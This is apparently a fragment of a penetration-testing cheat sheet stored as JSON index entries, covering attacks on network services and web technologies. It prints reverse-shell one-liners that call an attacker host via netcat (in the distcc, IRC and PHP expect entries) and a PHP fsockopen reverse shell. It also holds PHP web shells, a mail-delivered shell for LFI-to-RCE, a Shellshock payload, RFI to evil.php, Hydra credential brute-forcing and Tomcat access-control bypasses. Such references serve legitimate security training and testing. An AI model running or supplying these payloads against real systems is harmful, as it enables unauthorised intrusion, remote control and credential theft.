    "doc": "ftf-hacksheet",
    "title": "CVE-2004-2687",
    "content": " ",
    "url": "http://localhost:4000/#protocols--distcc--cve-2004-2687",
    "relUrl": "/#protocols--distcc--cve-2004-2687"
  },"178": {
    "doc": "ftf-hacksheet",
    "title": "Identification",
    "content": ". | Using distcc NSE (ref):nmap -sS -n -Pn --open -T4 --min-rate=1000 -p3632 --script=distcc-cve2004-2687 &lt;ip&gt; . | . ",
    "url": "http://localhost:4000/#protocols--distcc--cve-2004-2687--identification",
    "relUrl": "/#protocols--distcc--cve-2004-2687--identification"
  },"179": {
    "doc": "ftf-hacksheet",
    "title": "Exploitation",
    "content": ". | Remote Command Execution:nmap -sS -n -Pn --open -T4 --min-rate=1000 -p3632 --script=distcc-cve2004-2687 --script-args=\"distcc-cve2004-2687.cmd='nc &lt;local-ip&gt; 8080 -e /bin/sh'\" &lt;ip&gt; . | . ",
    "url": "http://localhost:4000/#protocols--distcc--cve-2004-2687--exploitation",
    "relUrl": "/#protocols--distcc--cve-2004-2687--exploitation"
  },"180": {
    "doc": "ftf-hacksheet",
    "title": "RDP",
    "content": " ",
    "url": "http://localhost:4000/#protocols--rdp",
    "relUrl": "/#protocols--rdp"
  },"181": {
    "doc": "ftf-hacksheet",
    "title": "Windows",
    "content": ". | Enable access:reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /f /v fDenyTSConnections /t REG_DWORD /d 0 :: Check the firewall section for :: allowing the ports . | See the PowerShell way for enabling the RDP at the Trick Configuration section | . ",
    "url": "http://localhost:4000/#protocols--rdp--windows",
    "relUrl": "/#protocols--rdp--windows"
  },"182": {
    "doc": "ftf-hacksheet",
    "title": "IRC",
    "content": " ",
    "url": "http://localhost:4000/#protocols--irc",
    "relUrl": "/#protocols--irc"
  },"183": {
    "doc": "ftf-hacksheet",
    "title": "Linux",
    "content": ". | You may execute commands via netcat:echo \"AB; nc -e /bin/sh &lt;attacker-ip&gt; &lt;port&gt;\" | nc 127.0.0.1 &lt;IRC-port&gt; . | . ",
    "url": "http://localhost:4000/#protocols--irc--linux",
    "relUrl": "/#protocols--irc--linux"
  },"184": {
    "doc": "ftf-hacksheet",
    "title": "VoIP",
    "content": " ",
    "url": "http://localhost:4000/#protocols--voip",
    "relUrl": "/#protocols--voip"
  },"185": {
    "doc": "ftf-hacksheet",
    "title": "SIP",
    "content": " ",
    "url": "http://localhost:4000/#protocols--voip--sip",
    "relUrl": "/#protocols--voip--sip"
  },"186": {
    "doc": "ftf-hacksheet",
    "title": "Tools",
    "content": ". | sipvicious suite | . ",
    "url": "http://localhost:4000/#protocols--voip--sip--tools",
    "relUrl": "/#protocols--voip--sip--tools"
  },"187": {
    "doc": "ftf-hacksheet",
    "title": "SIP Scan",
    "content": ". | With svmap:# Identify SIP servers svmap &lt;ip/hostname&gt; # Use -p to target different ports . | . ",
    "url": "http://localhost:4000/#protocols--voip--sip--sip-scan",
    "relUrl": "/#protocols--voip--sip--sip-scan"
  },"188": {
    "doc": "ftf-hacksheet",
    "title": "PBX Extensions Scan",
    "content": ". | With svwar:# Find working extensions svwar -m OPTIONS -e100-999 &lt;ip/host&gt; # Use -D instead of -e for defaults # Alternatively use: # - REGISTER -&gt; May not always work # - INVITE -&gt; Note: simulates a call # Use --force to bypass checks . | . ",
    "url": "http://localhost:4000/#protocols--voip--sip--pbx-extensions-scan",
    "relUrl": "/#protocols--voip--sip--pbx-extensions-scan"
  },"189": {
    "doc": "ftf-hacksheet",
    "title": "SSL/TLS",
    "content": " ",
    "url": "http://localhost:4000/#protocols--ssl-tls",
    "relUrl": "/#protocols--ssl-tls"
  },"190": {
    "doc": "ftf-hacksheet",
    "title": "Scan / Test",
    "content": ". | Proto/Cipher/Vulns - testssl.sh:# Checks Heartbleed and others testssl.sh --full &lt;url:port&gt; # -E check cipher per protocol # --starttls smtp -&gt; SMTPS checks . | Supported protocols Using sslscan:sslscan &lt;ip&gt; . | . ",
    "url": "http://localhost:4000/#protocols--ssl-tls--scan---test",
    "relUrl": "/#protocols--ssl-tls--scan---test"
  },"191": {
    "doc": "ftf-hacksheet",
    "title": "Downgrade OpenSSL System-wide",
    "content": ". | Modify /etc/ssl/openssl.cnf:[system_default_sect] # &gt; Old &lt; # MinProtocol = TLSv1.2 # CipherString = DEFAULT@SECLEVEL=2 # &gt; New &lt; MinProtocol = None CipherString = None # &gt; Or set explicit versions &lt; # MinProtocol = TLSv1.0 # CipherString = DEFAULT@SECLEVEL=1 . | Note that this has nothing to do with certificate validation and this varies per tool | . ",
    "url": "http://localhost:4000/#protocols--ssl-tls--downgrade-openssl-system-wide",
    "relUrl": "/#protocols--ssl-tls--downgrade-openssl-system-wide"
  },"192": {
    "doc": "ftf-hacksheet",
    "title": "Heartbleed",
    "content": " ",
    "url": "http://localhost:4000/#protocols--ssl-tls--heartbleed",
    "relUrl": "/#protocols--ssl-tls--heartbleed"
  },"193": {
    "doc": "ftf-hacksheet",
    "title": "Affected",
    "content": ". | OpenSSL 1.0.1 &lt; 1.0.1g | Not vulnerable on those compiled with -DOPENSSL_NO_HEARTBEATS | . ",
    "url": "http://localhost:4000/#protocols--ssl-tls--heartbleed--affected",
    "relUrl": "/#protocols--ssl-tls--heartbleed--affected"
  },"194": {
    "doc": "ftf-hacksheet",
    "title": "Exploits",
    "content": ". | attack.py# Ask for 16385 memory bytes ./attack.py -l 0x4001 &lt;ip-host&gt; # Find private RSA key on port 4343 ./attack.py -p 4343 -e &lt;ip-host&gt; . | heartleech - Auto-RSA key finder | heartbleed-tools - Multiple Tools | heatbleed.js - Find RSA key + set ciphers | pacemaker | heartbleed.c - Client/Server Exploiter | . ",
    "url": "http://localhost:4000/#protocols--ssl-tls--heartbleed--exploits",
    "relUrl": "/#protocols--ssl-tls--heartbleed--exploits"
  },"195": {
    "doc": "ftf-hacksheet",
    "title": "SMTP",
    "content": " ",
    "url": "http://localhost:4000/#protocols--smtp",
    "relUrl": "/#protocols--smtp"
  },"196": {
    "doc": "ftf-hacksheet",
    "title": "User enumeration",
    "content": " ",
    "url": "http://localhost:4000/#protocols--smtp--user-enumeration",
    "relUrl": "/#protocols--smtp--user-enumeration"
  },"197": {
    "doc": "ftf-hacksheet",
    "title": "Hydra",
    "content": ". | Site - Multi-protocol bruteforcer:# Use -S for SSL or -O for older SSL hydra -s &lt;port&gt; smtp-enum://&lt;ip&gt;/VRFY -L &lt;user-wlist&gt; -p &lt;domain&gt; # EXPN &amp; RCPT are VRFY alternatives # Use localhost as &lt;domain&gt; . | . ",
    "url": "http://localhost:4000/#protocols--smtp--user-enumeration--hydra",
    "relUrl": "/#protocols--smtp--user-enumeration--hydra"
  },"198": {
    "doc": "ftf-hacksheet",
    "title": "Password Bruteforce",
    "content": " ",
    "url": "http://localhost:4000/#protocols--smtp--password-bruteforce",
    "relUrl": "/#protocols--smtp--password-bruteforce"
  },"199": {
    "doc": "ftf-hacksheet",
    "title": "Hydra",
    "content": ". | Site - Multi-protocol bruteforcer:# Check the other auth type with: # hydra -U smtp hydra -L &lt;user-wlist&gt; -P &lt;pass-wlist&gt; -e ns -s &lt;port&gt; smtp://&lt;server&gt;/LOGIN # Use TLS: smtp://&lt;server&gt;/TLS:LOGIN # or with: smtps://&lt;server&gt;/LOGIN # Without module and single user hydra -l &lt;user&gt; -P &lt;pass-wlist&gt; -f -e ns -s &lt;port&gt; &lt;server&gt; smtp # Use -S for SSL or -O for older SSL . | . ",
    "url": "http://localhost:4000/#protocols--smtp--password-bruteforce--hydra",
    "relUrl": "/#protocols--smtp--password-bruteforce--hydra"
  },"200": {
    "doc": "ftf-hacksheet",
    "title": "Email Location",
    "content": " ",
    "url": "http://localhost:4000/#protocols--smtp--email-location",
    "relUrl": "/#protocols--smtp--email-location"
  },"201": {
    "doc": "ftf-hacksheet",
    "title": "Linux",
    "content": ". | Common email locations:/var/mail/&lt;user&gt; /var/spool/mail/&lt;user&gt; . | . ",
    "url": "http://localhost:4000/#protocols--smtp--email-location--linux",
    "relUrl": "/#protocols--smtp--email-location--linux"
  },"202": {
    "doc": "ftf-hacksheet",
    "title": "Send Email - LFI to RCE",
    "content": ". | Using swaks:swaks --to &lt;user&gt;@localhost --from test@test.net --header \"Subject: test shell\" --body 'SHELL-INIT:&lt;pre&gt; &lt;?php system($_REQUEST[\"cmd\"]); ?&gt; &lt;/pre&gt;:SHELL-END' --server &lt;ip-port&gt; # Or --port &lt;port&gt; for non-standard . | Using telnet:# nc -nC can also work telnet &lt;ip&gt; &lt;port&gt; # Keep the &lt;...&gt; below around emails EHLO world MAIL FROM:&lt;test@test.net&gt; RCPT TO:&lt;[user]@localhost&gt; DATA # The body goes from here { Date: $(LC_ALL=C date) To: [user]@localhost From: test@test.net Subject: test shell Message-Id: &lt;20210218153300.1486384@test&gt; SHELL-INIT:&lt;pre&gt; &lt;?php system($_REQUEST[\"cmd\"]); ?&gt; &lt;/pre&gt;:SHELL-END . # } To here where it automatically ends QUIT . | . ",
    "url": "http://localhost:4000/#protocols--smtp--send-email---lfi-to-rce",
    "relUrl": "/#protocols--smtp--send-email---lfi-to-rce"
  },"203": {
    "doc": "ftf-hacksheet",
    "title": "POP3",
    "content": " ",
    "url": "http://localhost:4000/#protocols--pop3",
    "relUrl": "/#protocols--pop3"
  },"204": {
    "doc": "ftf-hacksheet",
    "title": "Read Emails",
    "content": " ",
    "url": "http://localhost:4000/#protocols--pop3--read-emails",
    "relUrl": "/#protocols--pop3--read-emails"
  },"205": {
    "doc": "ftf-hacksheet",
    "title": "Telnet",
    "content": "telnet &lt;ip/domain&gt; 110 USER &lt;username&gt; PASS &lt;password&gt; # Undelete emails marked for deletion RSET # List emails LIST # Read email RETR &lt;mail-id&gt; QUIT . ",
    "url": "http://localhost:4000/#protocols--pop3--read-emails--telnet",
    "relUrl": "/#protocols--pop3--read-emails--telnet"
  },"206": {
    "doc": "ftf-hacksheet",
    "title": "Password Bruteforce",
    "content": " ",
    "url": "http://localhost:4000/#protocols--pop3--password-bruteforce",
    "relUrl": "/#protocols--pop3--password-bruteforce"
  },"207": {
    "doc": "ftf-hacksheet",
    "title": "Hydra",
    "content": ". | Usage - Faster to bruteforce than SMTP# Check the other auth type with: # hydra -U pop3 hydra -L &lt;user-wlist&gt; -P &lt;pass-wlist&gt; -e ns -s &lt;port&gt; pop3://&lt;server&gt;/CLEAR # Without module and single user hydra -l &lt;user&gt; -P &lt;pass-wlist&gt; -f -e ns -s &lt;port&gt; &lt;server&gt; pop3 # Use -S for SSL or -O for older SSL . | . ",
    "url": "http://localhost:4000/#protocols--pop3--password-bruteforce--hydra",
    "relUrl": "/#protocols--pop3--password-bruteforce--hydra"
  },"208": {
    "doc": "ftf-hacksheet",
    "title": "XML-RPC",
    "content": " ",
    "url": "http://localhost:4000/#protocols--xml-rpc",
    "relUrl": "/#protocols--xml-rpc"
  },"209": {
    "doc": "ftf-hacksheet",
    "title": "Clients",
    "content": " ",
    "url": "http://localhost:4000/#protocols--xml-rpc--clients",
    "relUrl": "/#protocols--xml-rpc--clients"
  },"210": {
    "doc": "ftf-hacksheet",
    "title": "curl",
    "content": ". | List methods:curl -d '&lt;?xml version=\"1.0\"?&gt; &lt;methodCall&gt; &lt;methodName&gt;system.listMethods&lt;/methodName&gt;&lt;params&gt;&lt;/params&gt;&lt;/methodCall&gt;' -H 'Content-Type: text/xml' &lt;url&gt;/xmlrpc.php . | Show method help:curl -d '&lt;?xml version=\"1.0\"?&gt; &lt;methodCall&gt;&lt;methodName&gt;system.methodHelp&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt; &lt;string&gt;system.listMethods&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt; &lt;/methodCall&gt;' -H 'Content-Type: text/xml' &lt;url&gt;/xmlrpc.php . | . ",
    "url": "http://localhost:4000/#protocols--xml-rpc--clients--curl",
    "relUrl": "/#protocols--xml-rpc--clients--curl"
  },"211": {
    "doc": "ftf-hacksheet",
    "title": "Bruteforce",
    "content": " ",
    "url": "http://localhost:4000/#protocols--xml-rpc--bruteforce",
    "relUrl": "/#protocols--xml-rpc--bruteforce"
  },"212": {
    "doc": "ftf-hacksheet",
    "title": "Hydra",
    "content": ". | Site - Multi-protocol bruteforcer:# Use the simplest method hydra -l none -P &lt;wlist&gt; &lt;ip&gt; https-post-form '/xmlrpc.php:&lt;?xml version=\"1.0\"?&gt;&lt;methodCall&gt;&lt;methodName&gt;pfsense.check_firmware_version&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;^PASS^&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;:failed:H=Content-Type\\: text/xml' # You may have to limit concurrency # to avoid crashing the service: # -t &lt;n-threads&gt; | -T &lt;n-threads&gt; . | . ",
    "url": "http://localhost:4000/#protocols--xml-rpc--bruteforce--hydra",
    "relUrl": "/#protocols--xml-rpc--bruteforce--hydra"
  },"213": {
    "doc": "ftf-hacksheet",
    "title": "NTP",
    "content": " ",
    "url": "http://localhost:4000/#protocols--ntp",
    "relUrl": "/#protocols--ntp"
  },"214": {
    "doc": "ftf-hacksheet",
    "title": "systemd",
    "content": ". | systemd-timesyncd.service controls NTP# Start the daemon systemctl start systemd-timesyncd.service # And/or timedatectl set-ntp true # See the time servers vi /etc/systemd/timesyncd.conf # Verify the configuration timedatectl show-timesync --all # Add a new server from an interface timedatectl ntp-servers &lt;iface&gt; &lt;ip&gt; . | . ",
    "url": "http://localhost:4000/#protocols--ntp--systemd",
    "relUrl": "/#protocols--ntp--systemd"
  },"215": {
    "doc": "ftf-hacksheet",
    "title": "ntpdate",
    "content": ". | Site - Synchronize system with NTP srv# Does not require system/chrony ntpdate &lt;ip&gt; . | . ",
    "url": "http://localhost:4000/#protocols--ntp--ntpdate",
    "relUrl": "/#protocols--ntp--ntpdate"
  },"216": {
    "doc": "ftf-hacksheet",
    "title": "Web",
    "content": " ",
    "url": "http://localhost:4000/#web",
    "relUrl": "/#web"
  },"217": {
    "doc": "ftf-hacksheet",
    "title": "Certificates",
    "content": " ",
    "url": "http://localhost:4000/#web--certificates",
    "relUrl": "/#web--certificates"
  },"218": {
    "doc": "ftf-hacksheet",
    "title": "crt.sh",
    "content": ". | Site - Certificate searcher | . ",
    "url": "http://localhost:4000/#web--certificates--crt-sh",
    "relUrl": "/#web--certificates--crt-sh"
  },"219": {
    "doc": "ftf-hacksheet",
    "title": "Servers",
    "content": " ",
    "url": "http://localhost:4000/#web--servers",
    "relUrl": "/#web--servers"
  },"220": {
    "doc": "ftf-hacksheet",
    "title": "Apache HTTP",
    "content": " ",
    "url": "http://localhost:4000/#web--servers--apache-http",
    "relUrl": "/#web--servers--apache-http"
  },"221": {
    "doc": "ftf-hacksheet",
    "title": "URL Bruteforce - Discovery",
    "content": ". | Wordlists: . | Apache.fuzz | apache | dirb ones | . | Mix them:# Better use duplicut sort -u *.txt &gt; all.txt . | . ",
    "url": "http://localhost:4000/#web--servers--apache-http--url-bruteforce---discovery",
    "relUrl": "/#web--servers--apache-http--url-bruteforce---discovery"
  },"222": {
    "doc": "ftf-hacksheet",
    "title": "Log Poisoning - LFI to RCE",
    "content": " ",
    "url": "http://localhost:4000/#web--servers--apache-http--log-poisoning---lfi-to-rce",
    "relUrl": "/#web--servers--apache-http--log-poisoning---lfi-to-rce"
  },"223": {
    "doc": "ftf-hacksheet",
    "title": "Linux",
    "content": ". | Common log locations:-- HTTP -- /var/log/httpd/access_log /var/log/httpd/error_log -- HTTPS -- /var/log/httpd/ssl_access_log /var/log/httpd/ssl_error_log /var/log/httpd/ssl_request_log . | Check custom locations in: . | /etc/apache2/envvars | /etc/apache2/apache2.conf | . | Find the default path of the server: . | /etc/apache2/sites-enabled/000-default.conf | . | . ",
    "url": "http://localhost:4000/#web--servers--apache-http--log-poisoning---lfi-to-rce--linux",
    "relUrl": "/#web--servers--apache-http--log-poisoning---lfi-to-rce--linux"
  },"224": {
    "doc": "ftf-hacksheet",
    "title": "Apache Tomcat",
    "content": " ",
    "url": "http://localhost:4000/#web--servers--apache-tomcat",
    "relUrl": "/#web--servers--apache-tomcat"
  },"225": {
    "doc": "ftf-hacksheet",
    "title": "Version Reveal Tricks",
    "content": ". | Tomcat might be susceptible to URL poisoning to allow revealing its version on a 400 Bad Request error | For example: . | &lt;site&gt;/\\ | &lt;site&gt;/%5c | . | . ",
    "url": "http://localhost:4000/#web--servers--apache-tomcat--version-reveal-tricks",
    "relUrl": "/#web--servers--apache-tomcat--version-reveal-tricks"
  },"226": {
    "doc": "ftf-hacksheet",
    "title": "URL Bruteforce - Discovery",
    "content": ". | Wordlists: . | ApacheTomcat.fuzz | tomcat | Also check the Apache ones | . | . ",
    "url": "http://localhost:4000/#web--servers--apache-tomcat--url-bruteforce---discovery",
    "relUrl": "/#web--servers--apache-tomcat--url-bruteforce---discovery"
  },"227": {
    "doc": "ftf-hacksheet",
    "title": "URL Reveal Tricks",
    "content": ". | Tomcat may be susceptible to URL poisoning to allow access to forbidden paths | For example: . | &lt;site&gt;/manager/status/..;/html | Goes to &lt;site&gt;/manager/html | even if direct access result in 401 | Also check &lt;site&gt;/manager;/status | Plus &lt;...&gt;/%252E%252E/manager/status | And &lt;..&gt;/;param=value/manager/status | And use it as base for discovery | . | To upload WAR files in manager/html tamper the POST request with a proxy | Or copy the full request from the browser&#8217;s Dev tools in curl format | for host-manager/html only UNC works | Remember that WAR files should be type java/jsp_shell_reverse_tcp when generating them with msfvenom | . ",
    "url": "http://localhost:4000/#web--servers--apache-tomcat--url-reveal-tricks",
    "relUrl": "/#web--servers--apache-tomcat--url-reveal-tricks"
  },"228": {
    "doc": "ftf-hacksheet",
    "title": "JServ - AJP",
    "content": " ",
    "url": "http://localhost:4000/#web--servers--apache-tomcat--jserv---ajp",
    "relUrl": "/#web--servers--apache-tomcat--jserv---ajp"
  },"229": {
    "doc": "ftf-hacksheet",
    "title": "Bruteforce Default Credentials",
    "content": ". | First check that the /manager/ URI asks for authentication (if it doesn&#8217;t and returns permission denied it won&#8217;t work)w3m http://&lt;ip:port&gt;/manager . | Get the default credentials from SecLists and separate users from passwords:# Users cut -d: -f1 tomcat-betterdefaultpasslist.txt | sort -u &gt; users.txt # Passwords cut -d: -f2 tomcat-betterdefaultpasslist.txt | sort -u &gt; passwords.txt . | Bruteforce the credentials with AJPy:python2 tomcat.py --port &lt;ajp-port&gt; bf -U users.txt -P passwords.txt /manager/ &lt;ip&gt; # Maybe also check the HTTP port # and under /manager/html . | Check that the credentials are indeed valid:python2 tomcat.py --port &lt;ajp-port&gt; list -u &lt;user&gt; -p &lt;password&gt; &lt;ip&gt; # Maybe also check the HTTP port . | . ",
    "url": "http://localhost:4000/#web--servers--apache-tomcat--jserv---ajp--bruteforce-default-credentials",
    "relUrl": "/#web--servers--apache-tomcat--jserv---ajp--bruteforce-default-credentials"
  },"230": {
    "doc": "ftf-hacksheet",
    "title": "Ghostcat - CVE-2020-1938",
    "content": ". | It is possible to upload files with AJPy if permissions to access /manager/ are obtained (prior section):# Create a .war java reverse shell python2 tomcat.py --port &lt;ajp-port&gt; upload -u &lt;user&gt; -p &lt;password&gt; &lt;shell&gt;.war &lt;ip&gt; # Maybe also check the HTTP port . | Check that the shell was deployed:python2 tomcat.py --port &lt;ajp-port&gt; list -u &lt;user&gt; -p &lt;password&gt; &lt;ip&gt; # Maybe also check the HTTP port . | Now execute the remote shell:# I couldn't check this, possibly # you can find it installed under # http://&lt;ip&gt;/manager/html/&lt;app&gt; # Or maybe this works: python2 tomcat.py --port &lt;ajp-port&gt; read_file --webapp=&lt;app&gt; / &lt;ip&gt; . | Metasploit tomcat_mgr_upload module worked with the HTTP port, but I couldn&#8217;t make AJPy work (with AJP port) | Note that the .war can be manually uploaded at http://&lt;ip&gt;/manager/html | . ",
    "url": "http://localhost:4000/#web--servers--apache-tomcat--jserv---ajp--ghostcat---cve-2020-1938",
    "relUrl": "/#web--servers--apache-tomcat--jserv---ajp--ghostcat---cve-2020-1938"
  },"231": {
    "doc": "ftf-hacksheet",
    "title": "IIS",
    "content": " ",
    "url": "http://localhost:4000/#web--servers--iis",
    "relUrl": "/#web--servers--iis"
  },"232": {
    "doc": "ftf-hacksheet",
    "title": "File/Dir Disclosure",
    "content": " ",
    "url": "http://localhost:4000/#web--servers--iis--file-dir-disclosure",
    "relUrl": "/#web--servers--iis--file-dir-disclosure"
  },"233": {
    "doc": "ftf-hacksheet",
    "title": "Short Name Enumerator",
    "content": " ",
    "url": "http://localhost:4000/#web--servers--iis--file-dir-disclosure--short-name-enumerator",
    "relUrl": "/#web--servers--iis--file-dir-disclosure--short-name-enumerator"
  },"234": {
    "doc": "ftf-hacksheet",
    "title": "sns",
    "content": ". | Site - Go IIS shortname scanner:# Add headers through --proxy &lt;http&gt; sns -c -u &lt;url&gt; # -t &lt;n&gt; - Limit threads: 1 -&gt; safest # Multiple urls sns -c -f &lt;(echo -e '&lt;url1&gt;\\n&lt;url2&gt;') . | . ",
    "url": "http://localhost:4000/#web--servers--iis--file-dir-disclosure--short-name-enumerator--sns",
    "relUrl": "/#web--servers--iis--file-dir-disclosure--short-name-enumerator--sns"
  },"235": {
    "doc": "ftf-hacksheet",
    "title": "IIS shortname Scanner",
    "content": ". | Site - Python IIS shortname scanner:python3 main.py &lt;url&gt; . | . ",
    "url": "http://localhost:4000/#web--servers--iis--file-dir-disclosure--short-name-enumerator--iis-shortname-scanner",
    "relUrl": "/#web--servers--iis--file-dir-disclosure--short-name-enumerator--iis-shortname-scanner"
  },"236": {
    "doc": "ftf-hacksheet",
    "title": "File Extension Bypass",
    "content": " ",
    "url": "http://localhost:4000/#web--servers--iis--file-extension-bypass",
    "relUrl": "/#web--servers--iis--file-extension-bypass"
  },"237": {
    "doc": "ftf-hacksheet",
    "title": "Information",
    "content": ". | Issue only existing in IIS &lt;= 6 | Reference | . ",
    "url": "http://localhost:4000/#web--servers--iis--file-extension-bypass--information",
    "relUrl": "/#web--servers--iis--file-extension-bypass--information"
  },"238": {
    "doc": "ftf-hacksheet",
    "title": "Attack",
    "content": ". | Use a semicolon in the extension:&lt;file&gt;.asp;.jpg # Executed/Saved as &lt;file&gt;.asp . | . ",
    "url": "http://localhost:4000/#web--servers--iis--file-extension-bypass--attack",
    "relUrl": "/#web--servers--iis--file-extension-bypass--attack"
  },"239": {
    "doc": "ftf-hacksheet",
    "title": "Technologies",
    "content": " ",
    "url": "http://localhost:4000/#web--technologies",
    "relUrl": "/#web--technologies"
  },"240": {
    "doc": "ftf-hacksheet",
    "title": "CGI",
    "content": " ",
    "url": "http://localhost:4000/#web--technologies--cgi",
    "relUrl": "/#web--technologies--cgi"
  },"241": {
    "doc": "ftf-hacksheet",
    "title": "Shellshock - CVE-2014-6271",
    "content": ". | Find the CGI login page (ie: /session_login.cgi) and identify one of the post fields (like user) | Pay attention to the headers in place | Perform a common login POST request using a sleep as User-Agent:() { :; };sleep 10 # In some cases sleep 10 alone works . | With curl:# -A '...' or -H 'User-Agent: &lt;cmd&gt;' # Remove -s if curl errors to check curl -A '() { :; };sleep 10' -H 'Cookie: testing=1; sid=x' -s 'https://&lt;ip-port&gt;/session_login.cgi' -d 'user=test' | w3m -T text/html -dump # -H \"Cookie: ...\" to bypass the: # Error - No cookies . | May be easier with burp or mitmproxy | Important: Only builtins may be available, PATH is unset, use full path | Note that any other script in the /cgi-bin/ folder may also be susceptible to shellshock | Scripts there may even set a text/x-sh header (or broken ones), so add an echo; before the test command | . ",
    "url": "http://localhost:4000/#web--technologies--cgi--shellshock---cve-2014-6271",
    "relUrl": "/#web--technologies--cgi--shellshock---cve-2014-6271"
  },"242": {
    "doc": "ftf-hacksheet",
    "title": "PHP",
    "content": " ",
    "url": "http://localhost:4000/#web--technologies--php",
    "relUrl": "/#web--technologies--php"
  },"243": {
    "doc": "ftf-hacksheet",
    "title": "Login Bypass",
    "content": " ",
    "url": "http://localhost:4000/#web--technologies--php--login-bypass",
    "relUrl": "/#web--technologies--php--login-bypass"
  },"244": {
    "doc": "ftf-hacksheet",
    "title": "Array",
    "content": ". | Array types may break the form validation logic | Simply change the form fields/params . | from user=&lt;user&gt; | to user[]=&lt;user&gt; | . | Try changing only one at a time | . ",
    "url": "http://localhost:4000/#web--technologies--php--login-bypass--array",
    "relUrl": "/#web--technologies--php--login-bypass--array"
  },"245": {
    "doc": "ftf-hacksheet",
    "title": "Code Execution",
    "content": " ",
    "url": "http://localhost:4000/#web--technologies--php--code-execution",
    "relUrl": "/#web--technologies--php--code-execution"
  },"246": {
    "doc": "ftf-hacksheet",
    "title": "System Commands",
    "content": "&lt;?php $out=shell_exec(\"&lt;cmd&gt; 2&gt;&amp;1\"); echo \"&lt;pre&gt;$out&lt;/pre&gt;\"; ?&gt; // Using GET cmd parameter &lt;?php echo \"&lt;pre&gt;\" . shell_exec($_GET[\"cmd\"] . \" 2&gt;&amp;1\") . \"&lt;/pre&gt;\"; ?&gt; // Using base64 &lt;?php echo \"&lt;pre&gt;\" . shell_exec(base64_decode($_GET[\"cmd\"])) . \"&lt;/pre&gt;\"; ?&gt; // $_REQUEST is \"like\" $_GET + $_POST . ",
    "url": "http://localhost:4000/#web--technologies--php--code-execution--system-commands",
    "relUrl": "/#web--technologies--php--code-execution--system-commands"
  },"247": {
    "doc": "ftf-hacksheet",
    "title": "Bind/Reverse Shells",
    "content": "// Reverse Shell &lt;?php $sock=fsockopen(\"&lt;ip&gt;\", &lt;port&gt;); exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\"); ?&gt; // Use passthru with raw output // Use pipes with popen or proc_open . ",
    "url": "http://localhost:4000/#web--technologies--php--code-execution--bind-reverse-shells",
    "relUrl": "/#web--technologies--php--code-execution--bind-reverse-shells"
  },"248": {
    "doc": "ftf-hacksheet",
    "title": "Protocol Wrappers",
    "content": ". | Docs - RCE through HTTP parameters:# Plain text &lt;url&gt;?file=data://text/plain,&lt;?php echo shell_exec(\"&lt;cmd&gt;\"); ?&gt; # Also try data://text/plain,[...] # Base64 &lt;url&gt;?file=data://text/plain;base64,&lt;base64payload&gt; . | LFI through HTTP parameters:&lt;url&gt;?file=/etc/passwd # or forcing file &lt;url&gt;?file=file:///etc/passwd # SMB shares can be opened &lt;url&gt;?file=\\\\&lt;ip&gt;\\share\\evil.php . | RFI/RFE through HTTP parameters:&lt;url&gt;?file=http://&lt;domain/evil.php # or using php filter &lt;url&gt;?file=php://filter/resource=http://&lt;domain/evil.php # or using ssh2, ftp, etc . | Expect wrapper also allows cmd exec:# Test netcat, space is $IFS expect://nc$IFS10.0.0.1$IFS8080 . | . ",
    "url": "http://localhost:4000/#web--technologies--php--code-execution--protocol-wrappers",
    "relUrl": "/#web--technologies--php--code-execution--protocol-wrappers"
  },"249": {
    "doc": "ftf-hacksheet",
    "title": "File Upload",
    "content": " ",
    "url": "http://localhost:4000/#web--technologies--php--file-upload",
    "relUrl": "/#web--technologies--php--file-upload"
  },"250": {
    "doc": "ftf-hacksheet",
    "title": "PHPINFO - info.php",
    "content": ". | Note that this is a temporary upload | First check that file_uploads = On | Perform a POST request to info.php:POST &lt;uri&gt;/info.php HTTP/1.1 Host: &lt;domain/ip&gt; User-Agent: Test Cookie: PHPSESSID=&lt;sess-id&gt; Content-Length: &lt;body-len+newlines&gt; Content-Type: &lt;type&gt; &lt;body&gt; . | &lt;type&gt; and &lt;body&gt; may have to be multipart/form:Content-Type: multipart/form-data; boundary=---------------&lt;keyword&gt; ---------------&lt;keyword&gt; Content-Disposition: form-data; name=\"&lt;var&gt;\"; filename=\"test.txt\" Content-Type: text/plainSecurity &lt;file-content&gt; ---------------&lt;keyword&gt; . | If phpinfo displays the temporary location of the file, leverage a LFI to RCE with this path | Scripts to improve the success rate as the files live for a few seconds: . | phpinfo-Local-File-Inclusion | lfito_rce | phpinfolfi.py (original) | . | . ",
    "url": "http://localhost:4000/#web--technologies--php--file-upload--phpinfo---info-php",
    "relUrl": "/#web--technologies--php--file-upload--phpinfo---info-php"
  },"251": {
    "doc": "ftf-hacksheet",
    "title": "Object Injection",
    "content": ". | See - PHP objects can be serialized and included in vulnerable applications (see the phar wrapper) | Leverage destructors, function calls, etc using user-controlled code to perform RCE | . ",
    "url": "http://localhost:4000/#web--technologies--php--object-injection",
    "relUrl": "/#web--technologies--php--object-injection"
  },"252": {
    "doc": "ftf-hacksheet",
    "title": "XML",
    "content": " ",
    "url": "http://localhost:4000/#web--technologies--xml",
    "relUrl": "/#web--technologies--xml"
  },"253": {
    "doc": "ftf-hacksheet",
    "title": "Injection",
    "content": " ",
    "url": "http://localhost:4000/#web--technologies--xml--injection",
    "relUrl": "/#web--technologies--xml--injection"
  },"254": {
    "doc": "ftf-hacksheet",
    "title": "Notes",
    "content": ". | When injecting the XML, note that the DOCTYPE or ELEMENT may need to be defined before XML tags | . ",
    "url": "http://localhost:4000/#web--technologies--xml--injection--notes",
    "relUrl": "/#web--technologies--xml--injection--notes"
  },"255": {
    "doc": "ftf-hacksheet",
    "title": "XSS",
    "content": "&lt;!-- Try first --&gt; &lt;![CDATA[&lt;script&gt;alert('xss')&lt;/script&gt;]]&gt; &lt;!-- CDATA is not parsed by XML --&gt; &lt;!-- Alternate --&gt; &lt;![CDATA[&lt;]]&gt;script&lt;![CDATA[&gt;]]&gt;alert('xss')&lt;![CDATA[&lt;]]&gt;/script&lt;![CDATA[&gt;]]&gt; . ",
    "url": "http://localhost:4000/#web--technologies--xml--injection--xss",
    "relUrl": "/#web--technologies--xml--injection--xss"
  },"256": {
    "doc": "ftf-hacksheet",
    "title": "XXE",
